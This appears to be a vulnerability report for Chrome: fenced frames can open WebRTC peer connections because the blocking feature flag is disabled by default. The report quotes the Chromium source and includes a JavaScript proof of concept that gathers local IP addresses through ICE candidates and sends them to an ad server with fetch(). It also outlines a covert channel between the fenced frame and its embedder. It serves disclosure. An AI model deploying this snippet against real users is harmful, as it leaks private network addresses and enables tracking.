# Finding 030: Fenced Frame WebRTC P2P Unconditionally Available (Feature Flag Disabled)

## Summary

The WebRTC P2P socket binding for fenced frames is gated behind `kFencedFramesLocalUnpartitionedDataAccess`, which is `FEATURE_DISABLED_BY_DEFAULT`. This means in production Chrome, fenced frames can freely create `RTCPeerConnection`, gather ICE candidates (leaking local IP addresses), and establish P2P DataChannels that bypass fenced frame communication boundaries.

## Affected Files

- `third_party/blink/common/features.cc:780-781` — Feature flag definition (`FEATURE_DISABLED_BY_DEFAULT`)
- `content/browser/browser_interface_binders.cc:879-885` — Browser-side P2P blocking (only active when flag enabled)
- `third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:649-654` — Renderer-side blocking (only active when flag enabled)

## Details

### Browser-side binding (browser_interface_binders.cc:879-885)

```cpp
bool should_ban_p2p =
    base::FeatureList::IsEnabled(
        blink::features::kFencedFramesLocalUnpartitionedDataAccess) &&
    host->IsNestedWithinFencedFrame();
if (!should_ban_p2p) {
    map->Add<network::mojom::P2PSocketManager>(&BindSocketManager);
}
```

Since the feature is disabled, `should_ban_p2p` is always `false`, so `P2PSocketManager` is always bound for fenced frames.

### Renderer-side check (rtc_peer_connection.cc:649-654)

```cpp
if (RuntimeEnabledFeatures::
        FencedFramesLocalUnpartitionedDataAccessEnabled() &&
    window->GetFrame()->IsInFencedFrameTree()) {
    exception_state.ThrowDOMException(...);
}
```

Same gating — since the feature is disabled, the throw never happens.

### Feature flag (features.cc:780-781)

```cpp
// Controls functionality related to network revocation/local unpartitioned
// data access in fenced frames.
BASE_FEATURE(kFencedFramesLocalUnpartitionedDataAccess,
             base::FEATURE_DISABLED_BY_DEFAULT);
```

## Attack Scenarios

### 1. Local IP Address Leak from Fenced Frame

```javascript
// Inside fenced frame (FLEDGE ad)
const pc = new RTCPeerConnection({iceServers: []});
pc.createDataChannel('leak');
pc.createOffer().then(o => pc.setLocalDescription(o));
pc.onicecandidate = e => {
  if (e.candidate) {
    // e.candidate.candidate contains local IP addresses
    // Send to ad server via fetch()
    fetch('https://ad.example/collect?ip=' + e.candidate.candidate);
  }
};
```

### 2. Covert Communication Channel Between Fenced Frame and Embedder

1. Fenced frame creates RTCPeerConnection and generates SDP offer
2. Fenced frame sends SDP offer to shared signaling server via fetch()
3. Embedding page's JavaScript receives SDP offer from signaling server
4. Embedding page creates RTCPeerConnection, generates answer
5. Both sides exchange ICE candidates via signaling server
6. Direct P2P DataChannel established — bypasses fenced frame boundary

## Impact

- **No compromised renderer needed**: Standard JavaScript APIs
- **Privacy violation**: Fenced frames are designed to prevent the ad from communicating with the embedder and from fingerprinting the user. WebRTC P2P enables both.
- **Affects Privacy Sandbox**: FLEDGE (Protected Audience) ads are served in fenced frames specifically for privacy isolation
- **Local IP leak**: ICE candidate gathering reveals private network addresses
- **Communication bypass**: DataChannels provide a high-bandwidth side channel

## VRP Value

**Medium-High** — This is a significant privacy issue in Chrome's Privacy Sandbox:
1. The code comments at browser_interface_binders.cc:877 say "WebRTC p2p connections are disallowed in fenced frames" but this is only true when the feature flag is enabled
2. The feature flag is DISABLED_BY_DEFAULT, making the statement false in production
3. Fenced frame privacy isolation is a core Privacy Sandbox guarantee
4. The fix is simple: either enable the feature flag by default, or invert the logic

## Chromium Awareness

Partially known — the feature flag exists and the blocking code is written, but the flag being disabled means the protection is not active. The comment "Creation of RTCPeerConnection is already disabled in the renderer" is misleading when the flag is off.

## Comparison with Finding 026

Finding 026 documented fingerprinting API access from fenced frames (enumerateDevices, getVoices, etc.). Finding 030 is about a more fundamental issue — WebRTC P2P allows not just fingerprinting but also a direct communication channel that completely breaks fenced frame isolation.
